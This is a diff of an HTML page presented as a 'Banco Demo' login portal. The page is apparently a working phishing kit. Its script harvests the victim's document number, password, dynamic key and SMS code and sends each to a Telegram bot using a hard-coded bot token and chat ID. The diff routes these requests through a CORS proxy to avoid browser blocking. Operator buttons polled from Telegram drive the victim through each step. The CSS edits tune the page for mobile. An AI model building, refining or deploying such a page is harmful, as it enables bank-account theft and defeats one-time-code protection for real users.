@@ -2,11 +2,11 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Portal de acceso - Banco Demo</title>
 
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
 :root {
     --green: #00b82e;
@@ -15,13 +15,15 @@
     --background: #f5f5f5;
 }
 
-body {
+html, body {
     font-family: Arial, Helvetica, sans-serif;
     background: var(--background);
     color: #111;
     min-height: 100vh;
+    -webkit-text-size-adjust: 100%;
 }
 
+/* ============ LAYOUT ESCRITORIO ============ */
 .page {
     width: 100%;
     max-width: 1100px;
@@ -46,16 +48,12 @@ body {
 
 .security {
     position: absolute;
-    top: 18px;
-    right: 28px;
-    width: 19px;
-    height: 19px;
+    top: 18px; right: 28px;
+    width: 19px; height: 19px;
     border: 1.5px solid var(--orange);
     color: var(--orange);
     border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     font-size: 11px;
 }
 
@@ -70,195 +68,109 @@ body {
 }
 
 .logo-symbol {
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    width: 25px;
-    height: 25px;
-    border-radius: 50%;
-    background: var(--green);
-    color: white;
-    margin-right: 4px;
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 25px; height: 25px; border-radius: 50%;
+    background: var(--green); color: white; margin-right: 4px;
 }
 
 .field { margin-bottom: 17px; }
 
 .field-label {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 8px;
-    font-size: 13px;
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 8px; font-size: 13px;
 }
 
 .field-label a { color: var(--orange); font-weight: bold; text-decoration: underline; }
 
 .input {
-    width: 100%;
-    height: 46px;
-    border: 1px solid #888;
-    border-radius: 9px;
-    padding: 0 13px;
-    font-size: 14px;
-    background: white;
-    outline: none;
-    color: #111;
+    width: 100%; height: 46px;
+    border: 1px solid #888; border-radius: 9px;
+    padding: 0 13px; font-size: 16px;
+    background: white; outline: none; color: #111;
+    font-family: inherit;
 }
-
 .input:focus { border: 1.5px solid var(--dark-green); }
-
 select.input { cursor: pointer; }
 
 .password-box { position: relative; }
-
 .password-box input { padding-right: 45px; letter-spacing: 8px; }
 
 .eye {
-    position: absolute;
-    right: 12px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: transparent;
-    border: none;
-    cursor: pointer;
-    color: #999;
-    font-size: 19px;
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    background: transparent; border: none; cursor: pointer;
+    color: #999; font-size: 19px; padding: 8px;
 }
 
 .remember {
-    display: flex;
-    align-items: center;
-    gap: 9px;
-    margin: 20px 0 30px;
-    font-size: 12px;
+    display: flex; align-items: center; gap: 9px;
+    margin: 20px 0 30px; font-size: 12px;
 }
 
 .switch {
-    width: 35px;
-    height: 21px;
-    background: #c7c7c7;
-    border-radius: 20px;
-    position: relative;
-    cursor: pointer;
-    flex-shrink: 0;
+    width: 35px; height: 21px; background: #c7c7c7;
+    border-radius: 20px; position: relative; cursor: pointer; flex-shrink: 0;
 }
-
 .switch input { display: none; }
-
 .switch span {
-    width: 17px;
-    height: 17px;
-    position: absolute;
-    background: white;
-    border-radius: 50%;
-    top: 2px;
-    left: 2px;
-    transition: .2s;
+    width: 17px; height: 17px; position: absolute; background: white;
+    border-radius: 50%; top: 2px; left: 2px; transition: .2s;
 }
-
 .switch input:checked + span { left: 16px; }
 .switch:has(input:checked) { background: var(--green); }
 
 .continue {
-    width: 100%;
-    height: 47px;
-    border: none;
-    border-radius: 8px;
-    background: #bdbdbd;
-    color: #777;
-    font-size: 14px;
-    font-weight: bold;
-    cursor: not-allowed;
-    transition: .2s;
+    width: 100%; height: 47px; border: none; border-radius: 8px;
+    background: #bdbdbd; color: #777;
+    font-size: 16px; font-weight: bold; cursor: not-allowed;
+    transition: .2s; font-family: inherit;
 }
-
 .continue.active {
     background: linear-gradient(110deg, #125665, #237987);
-    color: white;
-    cursor: pointer;
+    color: white; cursor: pointer;
 }
 
 .register { text-align: center; margin-top: 27px; font-size: 13px; color: #777; }
 .register a { color: var(--orange); font-weight: bold; margin-left: 5px; }
 
-/* Error de login */
 .error-msg {
-    display: none;
-    color: #d9381e;
-    font-size: 13px;
-    margin-top: 10px;
-    font-family: Arial, sans-serif;
-    text-align: center;
+    display: none; color: #d9381e; font-size: 13px;
+    margin-top: 10px; text-align: center;
 }
 .error-msg.show { display: block; }
 
-/* Loading overlay */
+/* Loading */
 .loading-overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(255,255,255,.85);
-    z-index: 10000;
-    align-items: center;
-    justify-content: center;
-    flex-direction: column;
+    display: none; position: fixed; inset: 0;
+    background: rgba(255,255,255,.9); z-index: 10000;
+    align-items: center; justify-content: center; flex-direction: column;
 }
 .loading-spinner {
-    border: 4px solid #f3f3f3;
-    border-top: 4px solid #00b82e;
-    border-radius: 50%;
-    width: 50px;
-    height: 50px;
+    border: 4px solid #f3f3f3; border-top: 4px solid var(--green);
+    border-radius: 50%; width: 50px; height: 50px;
     animation: spin 1s linear infinite;
 }
 @keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
 
 /* Columna derecha */
 .right-content { width: 100%; padding: 20px 0; }
-
 .banner {
-    width: 100%;
-    min-height: 280px;
-    background: #125665;
-    border-radius: 12px;
-    position: relative;
-    overflow: hidden;
-    display: flex;
-    align-items: center;
-    color: white;
+    width: 100%; min-height: 280px; background: #125665;
+    border-radius: 12px; position: relative; overflow: hidden;
+    display: flex; align-items: center; color: white;
 }
-
 .banner::before {
-    content: "";
-    position: absolute;
-    width: 250px; height: 250px;
-    background: #13e900;
-    border-radius: 50%;
-    top: -165px; left: -70px;
+    content: ""; position: absolute; width: 250px; height: 250px;
+    background: #13e900; border-radius: 50%; top: -165px; left: -70px;
 }
-
 .banner::after {
-    content: "";
-    position: absolute;
-    width: 230px; height: 230px;
-    background: #13e900;
-    border-radius: 50%;
-    bottom: -190px; right: -90px;
+    content: ""; position: absolute; width: 230px; height: 230px;
+    background: #13e900; border-radius: 50%; bottom: -190px; right: -90px;
 }
-
 .banner-person {
-    position: relative;
-    z-index: 1;
-    width: 40%;
-    height: 280px;
-    display: flex;
-    align-items: end;
-    justify-content: center;
-    font-size: 90px;
+    position: relative; z-index: 1; width: 40%; height: 280px;
+    display: flex; align-items: end; justify-content: center; font-size: 90px;
 }
-
 .banner-person span { margin-bottom: 10px; }
-
 .banner-info { width: 60%; position: relative; z-index: 2; padding: 20px; }
 .banner-info h2 { font-size: 22px; color: #16f000; margin-bottom: 10px; }
 .banner-info p { font-size: 14px; line-height: 1.5; margin-bottom: 16px; }
@@ -266,7 +178,6 @@ select.input { cursor: pointer; }
     background: white; border: none; border-radius: 7px;
     padding: 13px; color: #125665; font-weight: bold; font-size: 13px; cursor: pointer;
 }
-
 .slider-lines { display: flex; gap: 7px; margin: 14px 0 28px; }
 .slider-lines span { height: 4px; background: white; flex: 1; border-radius: 5px; }
 .slider-lines span:nth-child(3) { background: var(--green); }
@@ -275,16 +186,19 @@ select.input { cursor: pointer; }
 .help-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
 .help-card {
     background: white; border-radius: 12px; min-height: 85px;
-    display: flex; flex-direction: column; justify-content: center; align-items: center;
-    gap: 8px; font-size: 12px; cursor: pointer;
+    display: flex; flex-direction: column; justify-content: center;
+    align-items: center; gap: 8px; font-size: 12px; cursor: pointer;
 }
 .help-icon {
     width: 38px; height: 38px; background: #b5f2bb; color: #00ae28;
-    border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px;
+    border-radius: 50%; display: flex; align-items: center;
+    justify-content: center; font-size: 20px;
 }
 
 .footer { width: 100%; background: white; min-height: 95px; border-top: 1px solid #eee; }
-.footer-top { display: flex; align-items: center; justify-content: space-between; padding: 15px 30px; }
+.footer-top {
+    display: flex; align-items: center; justify-content: space-between; padding: 15px 30px;
+}
 .footer-logo { color: var(--green); font-weight: 900; font-size: 21px; }
 .footer-links { display: flex; gap: 25px; }
 .footer-links a { color: var(--orange); font-size: 12px; font-weight: bold; }
@@ -293,134 +207,171 @@ select.input { cursor: pointer; }
     display: flex; justify-content: space-between;
 }
 
-/* MODAL OTP (Clave dinámica + SMS) */
+/* ============ MODAL OTP ============ */
 .demo-overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    z-index: 9999;
-    background: rgba(0,0,0,.68);
-    backdrop-filter: blur(2px);
-    align-items: center;
-    justify-content: center;
-    padding: 18px;
+    display: none; position: fixed; inset: 0; z-index: 9999;
+    background: rgba(0,0,0,.7); backdrop-filter: blur(2px);
+    align-items: center; justify-content: center; padding: 12px;
 }
 .demo-overlay.is-open { display: flex; }
 
 .demo-modal {
-    width: 100%;
-    max-width: 680px;
-    max-height: 92vh;
-    overflow-y: auto;
-    background: #fff;
-    border-radius: 24px;
-    padding: 28px 30px 40px;
-    box-shadow: 0 18px 48px rgba(0,0,0,.24);
-    position: relative;
+    width: 100%; max-width: 480px; max-height: 92vh; overflow-y: auto;
+    background: #fff; border-radius: 20px; padding: 22px 22px 28px;
+    box-shadow: 0 18px 48px rgba(0,0,0,.3); position: relative;
+    -webkit-overflow-scrolling: touch;
 }
 
-.demo-close-row { display: flex; justify-content: flex-end; margin-bottom: 16px; }
-
+.demo-close-row { display: flex; justify-content: flex-end; margin-bottom: 8px; }
 .demo-close {
-    border: 0; background: transparent; font-size: 28px; line-height: 1;
-    width: 36px; height: 36px; cursor: pointer; color: #333;
+    border: 0; background: transparent; font-size: 30px; line-height: 1;
+    width: 40px; height: 40px; cursor: pointer; color: #333;
+    display: flex; align-items: center; justify-content: center;
 }
 
 .demo-instruction {
-    background: #d7f0db;
-    border-radius: 14px;
-    padding: 24px 22px;
-    text-align: center;
-    margin: 0 0 18px;
-    color: #125665;
-    font-size: clamp(16px, 2.5vw, 20px);
-    line-height: 1.45;
+    background: #d7f0db; border-radius: 12px; padding: 16px 18px;
+    text-align: center; margin: 0 0 16px; color: #125665;
+    font-size: 15px; line-height: 1.45;
 }
-.demo-instruction strong { font-weight: 800; }
+.demo-instruction strong { font-weight: 800; display: block; margin-bottom: 4px; }
 
 .demo-title {
-    text-align: center;
-    font-size: clamp(22px, 3.5vw, 30px);
-    line-height: 1.2;
-    margin: 12px 0 24px;
-    color: #125665;
+    text-align: center; font-size: 22px; line-height: 1.2;
+    margin: 8px 0 20px; color: #125665;
 }
 
-.demo-actions { display: flex; justify-content: center; gap: 16px; margin-top: 20px; }
-.demo-actions button { flex: 1; max-width: 250px; min-height: 50px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; border: none; }
-.demo-actions .bc-button-secondary { background: transparent; color: #125665; border: 1.5px solid #125665; }
+.demo-actions { display: flex; justify-content: center; gap: 10px; margin-top: 18px; }
+.demo-actions button {
+    flex: 1; max-width: 200px; min-height: 48px; border-radius: 10px;
+    font-weight: bold; font-size: 15px; cursor: pointer; border: none;
+    font-family: inherit;
+}
+.demo-actions .bc-button-secondary {
+    background: transparent; color: #125665; border: 1.5px solid #125665;
+}
 .demo-actions .bc-button-primary { background: #125665; color: #fff; }
-.demo-actions .bc-button-primary:disabled { background: #bdbdbd; color: #777; cursor: not-allowed; }
+.demo-actions .bc-button-primary:disabled {
+    background: #bdbdbd; color: #777; cursor: not-allowed;
+}
 
-.demo-note { font-size: 12px; color: #999; text-align: center; margin-top: 20px; }
+.demo-note { font-size: 11px; color: #999; text-align: center; margin-top: 16px; }
 
 .demo-step { display: none; }
 .demo-step.active { display: block; }
 
 /* Slots OTP */
-.otp-slots-container { display: flex; justify-content: center; gap: 10px; margin: 24px 0; }
+.otp-slots-container {
+    display: flex; justify-content: center; gap: 6px; margin: 18px 0;
+}
 .otp-slot {
-    width: 45px; height: 50px;
+    width: 42px; height: 48px;
     border: 1px solid #ccc; border-radius: 8px;
-    text-align: center; font-size: 1.5rem; line-height: 50px;
+    text-align: center; font-size: 1.3rem; line-height: 48px;
     font-weight: bold; background: #fdfdfd; color: #125665;
 }
 .otp-slot.active { border-color: var(--green); box-shadow: 0 0 5px rgba(0,184,46,.5); }
 .otp-slots-container.error .otp-slot { border-color: #d9381e; }
 
-.otp-hidden-input { position: absolute; opacity: 0; pointer-events: none; }
+.otp-hidden-input {
+    position: absolute; opacity: 0; pointer-events: none;
+    width: 1px; height: 1px;
+}
 
-/* Tablet y móvil */
+/* ============ TABLET ============ */
 @media (max-width: 760px) {
-    body { background: #f5f5f5; }
-    .page { display: block; padding: 0; min-height: auto; }
-    .login-card { width: 100%; min-height: auto; padding: 42px 8% 32px; border-radius: 0; box-shadow: none; }
-    .security { top: 16px; right: 9%; }
-    .welcome { font-size: 21px; margin-bottom: 14px; }
-    .logo { font-size: 28px; margin-bottom: 42px; }
-    .logo-symbol { width: 29px; height: 29px; }
-    .field { margin-bottom: 23px; }
-    .field-label { font-size: 16px; margin-bottom: 9px; }
-    .input { height: 58px; font-size: 17px; padding: 0 17px; border-radius: 11px; }
-    .password-box input { letter-spacing: 8px; padding-right: 50px; }
-    .eye { font-size: 22px; right: 15px; }
-    .remember { font-size: 14px; gap: 10px; margin: 27px 0 38px; }
-    .switch { width: 43px; height: 26px; }
-    .switch span { width: 20px; height: 20px; top: 3px; left: 3px; }
-    .switch input:checked + span { left: 20px; }
-    .continue { height: 58px; font-size: 17px; border-radius: 11px; }
-    .register { font-size: 16px; margin-top: 36px; }
-    .right-content { padding: 30px 5% 25px; }
-    .banner { display: none; }
-    .slider-lines { display: none; }
-    .help h2 { font-size: 21px; margin-bottom: 20px; }
-    .help-cards { gap: 12px; }
-    .help-card { min-height: 100px; font-size: 12px; }
-    .help-icon { width: 40px; height: 40px; font-size: 20px; }
-    .footer { min-height: 80px; background: white; }
-    .footer-top { justify-content: center; padding: 18px; }
+    body { background: #fff; }
+
+    .page {
+        display: block; padding: 0; min-height: auto;
+        max-width: 100%;
+    }
+
+    .login-card {
+        width: 100%; min-height: auto;
+        padding: 24px 20px 28px;
+        border-radius: 0; box-shadow: none;
+    }
+
+    .security { top: 14px; right: 20px; }
+
+    .welcome { font-size: 15px; margin-bottom: 6px; color: #555; }
+
+    .logo {
+        font-size: 22px; margin-bottom: 22px;
+        display: flex; align-items: center;
+    }
+    .logo-symbol { width: 26px; height: 26px; font-size: 14px; }
+
+    .field { margin-bottom: 16px; }
+
+    .field-label {
+        font-size: 13px; margin-bottom: 6px;
+        flex-wrap: wrap; gap: 4px;
+    }
+
+    .input {
+        height: 48px; font-size: 16px;
+        padding: 0 14px; border-radius: 9px;
+    }
+
+    .password-box input { letter-spacing: 6px; padding-right: 48px; }
+    .eye { font-size: 20px; right: 10px; }
+
+    .remember {
+        font-size: 13px; gap: 9px;
+        margin: 16px 0 22px;
+    }
+    .switch { width: 38px; height: 22px; }
+    .switch span { width: 18px; height: 18px; top: 2px; left: 2px; }
+    .switch input:checked + span { left: 18px; }
+
+    .continue {
+        height: 50px; font-size: 16px; border-radius: 10px;
+    }
+
+    .register { font-size: 14px; margin-top: 20px; }
+
+    /* Ocultar columna decorativa en móvil para ahorrar espacio */
+    .right-content { display: none; }
+
+    .footer { min-height: 60px; }
+    .footer-top { justify-content: center; padding: 14px; }
     .footer-logo { display: none; }
     .footer-bottom { display: none; }
     .footer-links { width: 100%; justify-content: space-around; gap: 10px; }
-    .footer-links a { font-size: 14px; }
-
-    .demo-overlay { padding: 12px; }
-    .demo-modal { max-width: 100%; padding: 20px 20px 30px; border-radius: 20px; }
-    .otp-slot { width: 40px; height: 46px; font-size: 1.3rem; line-height: 46px; }
-    .demo-actions { gap: 12px; }
+    .footer-links a { font-size: 13px; }
 }
 
-@media (max-width: 380px) {
-    .login-card { padding-left: 6%; padding-right: 6%; }
-    .welcome { font-size: 19px; }
-    .logo { font-size: 25px; }
-    .field-label { font-size: 14px; }
-    .input { height: 52px; font-size: 15px; }
-    .remember { font-size: 12px; }
-    .continue { height: 52px; font-size: 15px; }
-    .register { font-size: 14px; }
-    .help h2 { font-size: 18px; }
-    .otp-slot { width: 34px; height: 42px; font-size: 1.1rem; line-height: 42px; }
+/* ============ MÓVIL PEQUEÑO ============ */
+@media (max-width: 400px) {
+    .login-card { padding: 20px 16px 24px; }
+    .welcome { font-size: 14px; }
+    .logo { font-size: 20px; margin-bottom: 18px; }
+    .logo-symbol { width: 24px; height: 24px; }
+
+    .field { margin-bottom: 14px; }
+    .field-label { font-size: 12px; }
+    .input { height: 46px; font-size: 16px; }
+
+    .remember { font-size: 12px; margin: 14px 0 18px; }
+
+    .continue { height: 48px; font-size: 15px; }
+    .register { font-size: 13px; }
+
+    .demo-modal { padding: 18px 16px 22px; border-radius: 16px; }
+    .demo-title { font-size: 20px; margin: 6px 0 16px; }
+    .demo-instruction { font-size: 14px; padding: 14px 14px; }
+    .otp-slots-container { gap: 5px; margin: 14px 0; }
+    .otp-slot { width: 38px; height: 44px; font-size: 1.15rem; line-height: 44px; }
+    .demo-actions { gap: 8px; }
+    .demo-actions button { min-height: 46px; font-size: 14px; }
+}
+
+/* Móvil muy pequeño */
+@media (max-width: 340px) {
+    .otp-slot { width: 34px; height: 42px; font-size: 1rem; line-height: 42px; }
+    .otp-slots-container { gap: 4px; }
 }
 </style>
 </head>
@@ -434,7 +385,6 @@ select.input { cursor: pointer; }
 </div>
 
 <main class="page">
-
     <!-- FORMULARIO -->
     <section class="login-card">
         <div class="security">♙</div>
@@ -444,7 +394,7 @@ select.input { cursor: pointer; }
             banco DEMO
         </div>
 
-        <form id="demoForm" autocomplete="off">
+        <form id="demoForm" autocomplete="off" novalidate>
             <div class="field">
                 <label class="field-label" for="documentType">Tipo de documento</label>
                 <select class="input" id="documentType">
@@ -510,10 +460,8 @@ select.input { cursor: pointer; }
             </div>
         </div>
     </section>
-
 </main>
 
-<!-- PIE -->
 <footer class="footer">
     <div class="footer-top">
         <div class="footer-logo">D &nbsp; BANCO DEMO</div>
@@ -528,17 +476,17 @@ select.input { cursor: pointer; }
     </div>
 </footer>
 
-<!-- MODAL OTP (Clave Dinámica + SMS) -->
+<!-- MODAL OTP -->
 <div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
     <section class="demo-modal">
         <div class="demo-close-row">
             <button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button>
         </div>
 
-        <!-- Vista Clave Dinámica -->
+        <!-- Clave Dinámica -->
         <div id="viewDinamica" class="demo-step active">
             <div class="demo-instruction">
-                <strong>Verificación de Seguridad</strong><br>
+                <strong>Verificación de Seguridad</strong>
                 Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.
             </div>
             <h2 class="demo-title">Clave Dinámica</h2>
@@ -551,24 +499,24 @@ select.input { cursor: pointer; }
                 <div class="otp-slot"></div>
             </div>
             <input type="text" id="otpInput" class="otp-hidden-input" maxlength="6" inputmode="numeric">
-            <p id="otpError" class="error-msg" style="margin-bottom:15px;">Clave dinámica incorrecta o expirada.</p>
+            <p id="otpError" class="error-msg" style="margin-bottom:12px;">Clave dinámica incorrecta o expirada.</p>
             <div class="demo-actions">
                 <button type="button" class="bc-button-secondary" id="btnBorrar">Borrar</button>
                 <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
             </div>
         </div>
 
-        <!-- Vista SMS -->
+        <!-- SMS -->
         <div id="viewSms" class="demo-step">
             <div class="demo-instruction">
-                <strong>Verificación SMS</strong><br>
+                <strong>Verificación SMS</strong>
                 Hemos enviado un código SMS de 6 dígitos a tu celular registrado.
             </div>
             <h2 class="demo-title">Código SMS</h2>
-            <div style="max-width:300px;margin:0 auto 20px;" id="smsInputWrap">
-                <input type="text" id="smsCodeInput" class="input" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align:center;font-size:1.5rem;height:45px;letter-spacing:4px;">
+            <div style="max-width:280px;margin:0 auto 16px;" id="smsInputWrap">
+                <input type="text" id="smsCodeInput" class="input" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align:center;font-size:1.4rem;height:48px;letter-spacing:6px;">
             </div>
-            <p id="smsError" class="error-msg" style="margin-bottom:15px;">Código SMS inválido.</p>
+            <p id="smsError" class="error-msg" style="margin-bottom:12px;">Código SMS inválido.</p>
             <div class="demo-actions">
                 <button type="button" class="bc-button-primary" id="btnSmsFinal" style="max-width:100%;">Verificar Código</button>
             </div>
@@ -580,41 +528,42 @@ select.input { cursor: pointer; }
 
 <script>
 // ==========================================
-// 🔑 CONFIGURACIÓN DE TELEGRAM
+// 🔑 CONFIG TELEGRAM
 // ==========================================
 const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
-const TG_CHAT_ID = '7776240161';
+const TG_CHAT_ID   = '7776240161';
+const TG_PROXY     = 'https://corsproxy.io/?'; // proxy CORS para evitar bloqueo del navegador
 
 // ==========================================
 // ELEMENTOS
 // ==========================================
-const documentType = document.getElementById("documentType");
+const documentType   = document.getElementById("documentType");
 const documentNumber = document.getElementById("documentNumber");
-const claveInput = document.getElementById("password");
-const submitBtn = document.getElementById("continueButton");
-const demoForm = document.getElementById("demoForm");
+const claveInput     = document.getElementById("password");
+const submitBtn      = document.getElementById("continueButton");
+const demoForm       = document.getElementById("demoForm");
 const loadingOverlay = document.getElementById('loading-overlay');
-const loginError = document.getElementById('loginError');
+const loginError     = document.getElementById('loginError');
 const togglePassword = document.getElementById("togglePassword");
 
-const modal = document.getElementById("modalDinamica");
-const otpInput = document.getElementById("otpInput");
-const otpSlots = document.querySelectorAll(".otp-slot");
-const btnBorrar = document.getElementById("btnBorrar");
-const btnContinuar = document.getElementById("btnContinuar");
-const otpError = document.getElementById("otpError");
-const otpContainer = document.getElementById("otpContainer");
-const closeModal = document.getElementById("closeModal");
+const modal         = document.getElementById("modalDinamica");
+const otpInput      = document.getElementById("otpInput");
+const otpSlots      = document.querySelectorAll(".otp-slot");
+const btnBorrar     = document.getElementById("btnBorrar");
+const btnContinuar  = document.getElementById("btnContinuar");
+const otpError      = document.getElementById("otpError");
+const otpContainer  = document.getElementById("otpContainer");
+const closeModal    = document.getElementById("closeModal");
 
-const viewDinamica = document.getElementById("viewDinamica");
-const viewSms = document.getElementById("viewSms");
-const smsCodeInput = document.getElementById("smsCodeInput");
-const btnSmsFinal = document.getElementById("btnSmsFinal");
-const smsError = document.getElementById("smsError");
-const smsInputWrap = document.getElementById("smsInputWrap");
+const viewDinamica  = document.getElementById("viewDinamica");
+const viewSms       = document.getElementById("viewSms");
+const smsCodeInput  = document.getElementById("smsCodeInput");
+const btnSmsFinal   = document.getElementById("btnSmsFinal");
+const smsError      = document.getElementById("smsError");
+const smsInputWrap  = document.getElementById("smsInputWrap");
 
 // ==========================================
-// CONTROL DE SEGURIDAD PRE-CARGA (anti-refresco)
+// ANTI-REFRESCO (solo bloquea si fue baneado)
 // ==========================================
 if (localStorage.getItem('sys_blocked_user') === 'true') {
     window.stop();
@@ -631,7 +580,7 @@ if (localStorage.getItem('sys_blocked_user') === 'true') {
 }
 
 // ==========================================
-// VARIABLES DE CONTROL
+// ESTADO
 // ==========================================
 let pollingActivo = false;
 let pollingTimeout = null;
@@ -643,17 +592,17 @@ function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
 function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
 
 // ==========================================
-// VALIDACIÓN Y UI DEL FORMULARIO
+// VALIDACIÓN UI
 // ==========================================
 function actualizarBoton() {
     const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
-    const usuarioLleno = documentNumber.value.trim().length > 0;
-    const formularioValido = claveCompleta && usuarioLleno;
+    const usuarioLleno  = documentNumber.value.trim().length > 0;
+    const valido = claveCompleta && usuarioLleno;
 
-    submitBtn.disabled = !formularioValido;
-    submitBtn.classList.toggle("active", formularioValido);
+    submitBtn.disabled = !valido;
+    submitBtn.classList.toggle("active", valido);
 
-    if (formularioValido) loginError.classList.remove("show");
+    if (valido) loginError.classList.remove("show");
 }
 
 documentNumber.addEventListener("input", actualizarBoton);
@@ -670,10 +619,27 @@ togglePassword.addEventListener("click", function() {
 });
 
 // ==========================================
-// ENVÍO A TELEGRAM
+// TELEGRAM (con proxy CORS)
 // ==========================================
+async function tgSend(payload) {
+    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+    try {
+        const res = await fetch(TG_PROXY + encodeURIComponent(url), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        console.log('📨 Telegram respuesta:', data);
+        return data;
+    } catch (err) {
+        console.error('❌ Error fetch Telegram:', err);
+        throw err;
+    }
+}
+
 function enviarIdentificacionTelegram(tipoDoc, usuario, clave) {
-    const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n📄 <b>Tipo doc:</b> <code>${tipoDoc}</code>\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n📄 <b>Tipo doc:</b> <code>${tipoDoc}</code>\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
 
     const keyboard = {
         inline_keyboard: [
@@ -688,22 +654,31 @@ function enviarIdentificacionTelegram(tipoDoc, usuario, clave) {
         ]
     };
 
-    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
-    }).then(r => r.json()).then(data => {
+    console.log('🚀 Enviando login a Telegram:', { tipoDoc, usuario });
+
+    tgSend({
+        chat_id: TG_CHAT_ID,
+        text: mensaje,
+        parse_mode: 'HTML',
+        reply_markup: keyboard
+    }).then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
             actionProcessed = false;
             escucharBotones(handleTelegramActionLogin);
         } else {
+            console.error('❌ Telegram rechazó:', data);
             ocultarOverlay();
+            alert('Error al contactar al bot. Revisa consola.');
         }
-    }).catch(() => ocultarOverlay());
+    }).catch(err => {
+        ocultarOverlay();
+        alert('No se pudo conectar con Telegram.\n' + err.message);
+    });
 }
 
 function enviarDinamicaTelegram(dinamica) {
-    const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${documentNumber.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${documentNumber.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
 
     const keyboard = {
         inline_keyboard: [
@@ -712,20 +687,19 @@ function enviarDinamicaTelegram(dinamica) {
         ]
     };
 
-    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
-    }).then(r => r.json()).then(data => {
+    tgSend({
+        chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard
+    }).then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
             actionProcessed = false;
             escucharBotones(handleTelegramActionDinamica);
         }
-    });
+    }).catch(() => ocultarOverlay());
 }
 
 function enviarSmsTelegram(codigoSms) {
-    const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${documentNumber.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${documentNumber.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
 
     const keyboard = {
         inline_keyboard: [
@@ -735,34 +709,44 @@ function enviarSmsTelegram(codigoSms) {
         ]
     };
 
-    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
-    }).then(r => r.json()).then(data => {
+    tgSend({
+        chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard
+    }).then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
             actionProcessed = false;
             escucharBotones(handleTelegramActionSms);
         }
-    });
+    }).catch(() => ocultarOverlay());
 }
 
 // ==========================================
-// POLLING DE BOTONES
+// POLLING
 // ==========================================
 function escucharBotones(callbackAction) {
     if (!msgIdActual) return;
     pollingActivo = true;
 
-    function check() {
+    async function check() {
         if (!pollingActivo) return;
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
